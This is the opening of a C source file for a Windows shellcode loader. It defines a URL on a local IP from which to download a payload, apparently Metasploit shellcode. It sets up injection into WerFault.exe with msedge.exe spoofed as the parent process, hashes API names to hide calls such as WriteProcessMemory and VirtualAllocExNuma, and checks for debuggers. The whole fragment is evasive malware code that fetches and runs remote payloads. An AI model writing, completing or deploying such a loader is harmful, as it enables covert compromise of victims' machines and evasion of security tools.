#include <windows.h>
#include <WinInet.h>
#include <Tlhelp32.h>
#include <winternl.h>
#include "Evasion.h"

#pragma warning (disable:4996)
#pragma comment (lib, "Wininet.lib")

#define NtCurrentProcess() ((HANDLE)-1) //Pseudo handle for current process
#define TARGET_PROCESS "WerFault.exe"
#define TARGET_PARENT "msedge.exe"
#define PAYLOAD L"http://192.168.0.122/msf.bin"

//Api Hashing using Djb2
#define HASH_ANSI(API) (HashStringDjb2A((PCHAR) API))
#define HASH_WIDE(API) (HashStringDjb2W((PWCHAR) API))

//String hashing
#define H_MOD_KERNEL32 0x7AF0CEAE //KERNEL32.DLL
#define H_FUNC_VIRTUALALLOCEXNUMA 0xA74C727E //VirtualAllocExNuma
#define H_FUNC_WRITEPROCESSMEMORY 0xB27E00E1 //WriteProcessMemory
#define H_FUNC_ISDEBUGGERPRESENT 0x2E7E4140 //IsDebuggerPresent
#define H_FUNC_FLSALLOC 0xB90021EE //FlsAlloc
#define H_FUNC_OPENPROCESS 0xB76DF00F //OpenProcess
#define H_FUNC_CREATEPROCESSA 0x55FE21B2 //CreateProcessA
#define H_FUNC_GETENVIRONMENTVARIABLEA 0x51E3A6BA //GetEnvironmentVariableA
#define H_FUNC_DEBUGACTIVEPROCESSSTOP 0xAF633C26 //DebugActiveProcessStop

int FindMyProcess(const char* ProcessName);
BOOL DownloadPayload(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);